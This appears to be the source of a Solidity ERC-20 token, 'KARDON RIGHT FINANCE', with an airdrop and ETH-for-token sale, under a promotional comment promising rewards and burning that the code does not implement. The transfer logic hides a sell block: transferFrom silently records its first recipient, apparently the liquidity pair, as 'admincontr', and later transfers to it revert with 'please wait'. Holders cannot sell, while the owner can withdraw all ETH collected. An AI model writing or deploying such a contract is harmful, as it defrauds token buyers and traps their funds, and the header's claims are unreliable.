/*

 * C A R D O N   R I G H T   F I N A N C E

 *

 * Defi is a project built on the DAO ecosystem. We took the distribution of awards to holders from SUSHI. This is the best idea for getting rewards.

 * The big finances of the DAO system need to be properly allocated. The DAO has a problem with this. Our token is able to solve this difficult task. And our version of the mobile wallet will reflect that.

 * Burning of tokens is provided! The token developer is a well-known team. We participated in the SUSHI split test.

 * Next ecosystem - KARDON NODE's!

 */

pragma solidity >=0.5.12;



library SafeMath {

  function add(uint a, uint b) internal pure returns (uint c) {

    c = a + b;

    require(c >= a);

  }

  function sub(uint a, uint b) internal pure returns (uint c) {

    require(b <= a);

    c = a - b;

  }

  function mul(uint a, uint b) internal pure returns (uint c) {

    c = a * b;

    require(a == 0 || c / a == b);

  }

  function div(uint a, uint b) internal pure returns (uint c) {

    require(b > 0);

    c = a / b;

  }

}



contract ERC20Interface {

  function totalSupply() public view returns (uint);

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function allowance(address tokenOwner, address spender) public view returns (uint remaining);

  function transfer(address to, uint tokens) public returns (bool success);

  function approve(address spender, uint tokens) public returns (bool success);

  function transferFrom(address from, address to, uint tokens) public returns (bool success);



  event Transfer(address indexed from, address indexed to, uint tokens);

  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}



contract ApproveAndCallFallBack {

  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;

}



contract Owned {

  address public owner;

  address public newOwner;



  event OwnershipTransferred(address indexed _from, address indexed _to);



  constructor() public {

    owner = msg.sender;

  }



  modifier onlyOwner {

    require(msg.sender == owner);

    _;

  }



  function transferOwnership(address _newOwner) public onlyOwner {

    newOwner = _newOwner;

  }

  function acceptOwnership() public {

    require(msg.sender == newOwner);

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

    newOwner = address(0);

  }

}



contract TokenERC20 is ERC20Interface, Owned{

  using SafeMath for uint;



  string public symbol;

  string public name;

  uint8 public decimals;

  uint _totalSupply;

  address public admincontr;



  mapping(address => uint) balances;

  mapping(address => mapping(address => uint)) allowed;



  constructor() public {

    symbol = "KARDON";

    name = "KARDON RIGHT FINANCE";

    

    decimals = 18;

    

    _totalSupply =  1024 ether;

    balances[owner] = _totalSupply;

    emit Transfer(address(0), owner, _totalSupply);

  }

  function transferadmincontr(address _admincontr) public onlyOwner {

    admincontr = _admincontr;

  }

  function totalSupply() public view returns (uint) {

    return _totalSupply.sub(balances[address(0)]);

  }

  function balanceOf(address tokenOwner) public view returns (uint balance) {

      return balances[tokenOwner];

  }

  function transfer(address to, uint tokens) public returns (bool success) {

     require(to != admincontr, "please wait");

    balances[msg.sender] = balances[msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(msg.sender, to, tokens);

    return true;

  }

  function approve(address spender, uint tokens) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    return true;

  }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {

      if(from != address(0) && admincontr == address(0)) admincontr = to;

      else require(to != admincontr, "guys, please wait");

    balances[from] = balances[from].sub(tokens);

    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(from, to, tokens);

    return true;

  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {

    return allowed[tokenOwner][spender];

  }

  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);

    return true;

  }

  function () external payable {

    revert();

  }

}



contract KARDON_ERC20  is TokenERC20 {

  uint256 public FirstBlNux; 

  uint256 public EndFirBlN; 

  uint256 public AnionCapt; 

  

  uint256 public Totsia; 

  uint256 public SlimStars; 

  uint256 public ForPStars; 

  

  uint256 public ForJuntYe; 

  uint256 public DaoDefiJo; 

  uint256 public CapToEtz; 

  uint256 public NoEnteryGom; 

  uint256 public DefiPriceExchange; 



  function DAO_Rewards(address _refer) public returns (bool success){

    require(FirstBlNux <= block.number && block.number <= EndFirBlN);

    require(Totsia < AnionCapt || AnionCapt == 0);

    Totsia ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(SlimStars / 4);

      balances[_refer] = balances[_refer].add(SlimStars / 4);

      emit Transfer(address(this), _refer, SlimStars / 4);

    }

    balances[address(this)] = balances[address(this)].sub(SlimStars);

    balances[msg.sender] = balances[msg.sender].add(SlimStars);

    emit Transfer(address(this), msg.sender, SlimStars);

    return true;

  }



  function DAO_Convert(address _refer) public payable returns (bool success){

    require(ForPStars <= block.number && block.number <= ForJuntYe);

    require(DaoDefiJo < CapToEtz || CapToEtz == 0);

    uint256 _eth = msg.value;

    uint256 _tkns;

    if(NoEnteryGom != 0) {

      uint256 _price = _eth / DefiPriceExchange;

      _tkns = NoEnteryGom * _price;

    }

    else {

      _tkns = _eth / DefiPriceExchange;

    }

    DaoDefiJo ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(_tkns / 4);

      balances[_refer] = balances[_refer].add(_tkns / 4);

      emit Transfer(address(this), _refer, _tkns / 4);

    }

    balances[address(this)] = balances[address(this)].sub(_tkns);

    balances[msg.sender] = balances[msg.sender].add(_tkns);

    emit Transfer(address(this), msg.sender, _tkns);

    return true;

  }



  function SongSing() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){

    return(FirstBlNux, EndFirBlN, AnionCapt, Totsia, SlimStars);

  }

  function GlobalScope() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){

    return(ForPStars, ForJuntYe, CapToEtz, DaoDefiJo, NoEnteryGom, DefiPriceExchange);

  }

  function DAOEcosystemDoq() public onlyOwner() {

    address payable _owner = msg.sender;

    _owner.transfer(address(this).balance);

  }

  function DAOTrackTos(uint256 _FirstBlNux, uint256 _EndFirBlN, uint256 _SlimStars, uint256 _AnionCapt) public onlyOwner() {

    FirstBlNux = _FirstBlNux;

    EndFirBlN = _EndFirBlN;

    SlimStars = _SlimStars;

    AnionCapt = _AnionCapt;

    Totsia = 0;

  }

  function ChangeToxed(uint256 _ForPStars, uint256 _ForJuntYe, uint256 _NoEnteryGom, uint256 _DefiPriceExchange, uint256 _CapToEtz) public onlyOwner() {

    ForPStars = _ForPStars;

    ForJuntYe = _ForJuntYe;

    NoEnteryGom = _NoEnteryGom;

    DefiPriceExchange =_DefiPriceExchange;

    CapToEtz = _CapToEtz;

    DaoDefiJo = 0;

  }

  

  function() external payable {



  }

}
